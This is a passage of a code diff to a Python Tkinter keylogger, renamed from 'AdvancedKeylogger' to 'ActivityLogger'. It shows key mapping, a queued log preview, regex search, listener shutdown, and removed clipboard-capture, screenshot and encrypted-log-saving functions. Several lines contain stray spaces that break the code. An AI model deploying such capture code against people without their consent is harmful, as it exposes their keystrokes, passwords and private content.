+                "BACKSPACE": "[BACKSPACE]",
+                "TAB": "[TAB]",
+                "ESC": "[ESC]",
+                "DELETE": "[DELETE]"
+            }
+            
+            if key_str in key_map: 
+                return key_map[key_str]
+            
+            if key_str in ["CTRL_L", "CTRL_R", "SHIFT", "SHIFT_R", "ALT", "ALT_R", "CMD", "CMD_R"]:
                 return f"[{key_str}]"
+            
+            return f"[{key_str}]"
         except Exception:
             return None
 
-    def update_preview(self, log_entry):
-        log_font = get_best_font(LOG_FONTS, "Courier New")
-        self.preview_text.configure(state="normal")
-        self.preview_text.delete(1.0, tk.END)
-        if not self.keys:
-            self.preview_text.insert(tk.END, "No logs yet. Start logging to see activity here.")
-        else:
-            for entry in self.keys[-20:]:
+    def add_log_entry(self, entry: str, category: str = "keyboard"):
+        try:
+            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
+            full_entry = f"[{timestamp}] {entry}"
+            self.log_queue.put_nowait((full_entry, category))
+            self.queue_ui_update(self.update_preview)
+        except queue.Full:
+            pass
+
+    def update_preview(self):
+        try:
+            entries = []
+            while not self.log_queue.empty():
                 try:
-                    if "] [" in entry:
-                        time_part, rest = entry.split("] [", 1)
-                        app_part, key_part = rest.split("] ", 1)
-                        self.preview_text.insert(tk.END, f"{time_part}] [", ("date",))
-                        self.preview_text.insert(tk.END, f"{app_part}]", ("app",))
-                        self.preview_text.insert(tk.END, f" {key_part.strip()}\n", ("key",))
+                    entries.append(self.log_queue.get_nowait())
+                except queue.Empty:
+                    break
+            
+            if entries: 
+                self.preview_text. configure(state=tk.NORMAL)
+                for entry, category in entries:
+                    parts = entry.split(']', 1)
+                    if len(parts) == 2:
+                        timestamp_part = parts[0] + ']'
+                        content_part = parts[1]
+                        self.preview_text.insert(tk.END, timestamp_part, "timestamp")
+                        self. preview_text.insert(tk. END, content_part + "\n", category)
                     else:
-                        self.preview_text.insert(tk.END, entry + "\n", ("key",))
-                except Exception:
-                    self.preview_text.insert(tk.END, entry + "\n", ("key",))
-        self.preview_text.tag_configure("date", font=(log_font, 9), foreground="#4b8484")
-        self.preview_text.tag_configure("app", font=(log_font, 10, "bold"), foreground=self.theme["accent"])
-        self.preview_text.tag_configure("key", font=(log_font, 12), foreground=self.theme["fg"])
-        self.preview_text.see(tk.END)
-        self.preview_text.configure(state="disabled")
+                        self.preview_text.insert(tk.END, entry + "\n", category)
+                
+                line_count = int(self.preview_text.index('end-1c').split('.')[0])
+                if line_count > 1000:
+                    self.preview_text.delete('1.0', f'{line_count - 500}.0')
+                
+                self.preview_text.see(tk.END)
+                self.preview_text.configure(state=tk.DISABLED)
+        except Exception:
+            pass
 
-    def save_log(self):
-        if not self.keys:
-            return
-        date = datetime.datetime.now().strftime("%Y-%m-%d")
-        log_file = os.path.join(self.log_folder, date, f"summary_log_{date}.txt")
-        log_content = "\n".join(self.keys)
-        encrypted_content = self.cipher.encrypt(log_content.encode())
-        with open(log_file, "wb") as f:
-            f.write(encrypted_content)
-        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
-        self.keys.append(f"[{time_str}]  [LOG SAVED] [SAVED]")
-        self.update_preview(self.keys[-1])
-
-    def auto_save_logs(self):
-        while self.is_logging:
-            self.save_log()
-            try:
-                self.log_interval = int(self.log_interval_entry.get())
-            except ValueError:
-                self.log_interval = 30
-            time.sleep(self.log_interval)
-
-    def take_screenshot(self):
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        screenshot = ImageGrab.grab()
-        screenshot.save(os.path.join(self.screenshot_folder, f"screenshot_{timestamp}.png"))
-        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
-        log_entry = f"[{time_str}]  [SCREENSHOT] [SAVED]"
-        self.keys.append(log_entry)
-        self.update_preview(log_entry)
-
-    def clipboard_logger(self):
-        while self.is_logging:
-            try:
-                ct = pyperclip.paste()
-                if ct != self.last_clipboard and isinstance(ct, str) and ct.strip():
-                    self.last_clipboard = ct
-                    self.save_clipboard_text(ct)
-            except Exception:
-                pass
-            try:
-                img = ImageGrab.grabclipboard()
-                if img is not None:
-                    img_hash = hashlib.md5(img.tobytes()).hexdigest()
-                    if img_hash != self.last_clipboard_imghash:
-                        self.last_clipboard_imghash = img_hash
-                        self.save_clipboard_image(img)
-            except Exception:
-                pass
-            time.sleep(1)
-
-    def save_clipboard_text(self, txt):
-        folder = os.path.join(self.log_folder, datetime.datetime.now().strftime("%Y-%m-%d"), "clipboard")
-        os.makedirs(folder, exist_ok=True)
-        fname = os.path.join(folder, f"clipboard_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
-        with open(fname, "w", encoding="utf-8") as f:
-            f.write(txt)
-
-    def save_clipboard_image(self, img):
-        folder = os.path.join(self.log_folder, datetime.datetime.now().strftime("%Y-%m-%d"), "clipboard")
-        os.makedirs(folder, exist_ok=True)
-        fname = os.path.join(folder, f"clipboard_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png")
-        img.save(fname)
+    def take_screenshot_manual(self):
+        with self.context_lock:
+            if self.current_process and self.screenshot_manager:
+                threading.Thread(target=lambda: self.screenshot_manager.take_screenshot(self.current_process, "manual"), daemon=True).start()
 
     def search_logs(self):
-        query = self.search_entry.get().lower()
+        query = self.search_entry.get()
         if not query:
-            messagebox.showinfo("Info", "Please enter a search query.")
+            messagebox.showinfo("Search", "Please enter a search query.")
             return
-        self.preview_text.configure(state="normal")
-        self.preview_text.delete(1.0, tk.END)
-        found = False
-        for log in self.keys:
-            if query in log.lower():
-                self.preview_text.insert(tk.END, f"{log}\n")
-                found = True
-        if not found:
-            self.preview_text.insert(tk.END, "No matches found.\n")
-        self.preview_text.configure(state="disabled")
+        
+        self.preview_text.configure(state=tk.NORMAL)
+        self.preview_text.delete('1.0', tk.END)
+        found_count = 0
+        
+        try:
+            pattern = re.compile(query, re.IGNORECASE)
+            entries = []
+            temp_queue = queue.Queue()
+            
+            while not self.log_queue.empty():
+                try:
+                    entry = self.log_queue.get_nowait()
+                    entries.append(entry)
+                    temp_queue.put(entry)
+                except queue.Empty:
+                    break
+            
+            while not temp_queue.empty():
+                try:
+                    self.log_queue.put_nowait(temp_queue.get_nowait())
+                except queue. Full:
+                    break
+            
+            for entry, category in entries:
+                if pattern.search(entry):
+                    self.preview_text.insert(tk.END, entry + "\n", category)
+                    found_count += 1
+            
+            if found_count == 0:
+                self.preview_text.insert(tk.END, "No matches found.\n")
+            else:
+                self.preview_text.insert(tk.END, f"\n--- Found {found_count} matches ---\n")
+        except re.error:
+            self.preview_text.insert(tk.END, "Invalid regular expression.\n")
+        except Exception as e:
+            self.preview_text.insert(tk.END, f"Search error: {str(e)}\n")
+        
+        self. preview_text.configure(state=tk.DISABLED)
+
+    def open_log_folder(self):
+        # --- FIXED METHOD: Uses root_log_dir instead of base_folder ---
+        if not self.root_log_dir:
+             messagebox.showinfo("Info", "Log folder path not determined yet.")
+             return
+        
+        if not self.root_log_dir.exists():
+            messagebox.showinfo("Info", "Log folder has not been created yet. Press Start to create it.")
+            return
+
+        folder = self.root_log_dir.resolve()
+        try:
+            if sys.platform == "win32": 
+                os.startfile(str(folder))
+            elif sys. platform == "darwin":
+                subprocess. Popen(["open", str(folder)])
+            else:
+                subprocess.Popen(["xdg-open", str(folder)])
+        except Exception:
+            messagebox.showerror("Error", f"Could not open folder:\n{folder}")
+
+    def queue_ui_update(self, func):
+        try:
+            self.ui_update_queue.put_nowait(func)
+        except queue.Full:
+            pass
+
+    def process_ui_updates(self):
+        try:
+            while not self.ui_update_queue.empty():
+                try:
+                    func = self.ui_update_queue.get_nowait()
+                    func()
+                except queue.Empty:
+                    break
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        
+        if not self.shutdown_event.is_set():
+            self.root.after(100, self.process_ui_updates)
+
+    def on_closing(self):
+        self.shutdown_event.set()
+        if self.is_logging:
+            self.stop_logging()
+        if self.hotkey_listener:
+            try:
+                self.hotkey_listener.stop()
+            except Exception:
+                pass
+        if self.keyboard_listener:
+            try: 
+                self.keyboard_listener.stop()
+            except Exception:
+                pass
+        if self.mouse_listener:
+            try:
+                self.mouse_listener.stop()
+            except Exception:
+                pass
+        time.sleep(0.3)
+        self.root.destroy()
+
 
 def main():
     root = tk.Tk()
-    app = AdvancedKeylogger(root)
+    app = ActivityLogger(root)
     root.mainloop()
+
 
 if __name__ == "__main__":
     main()
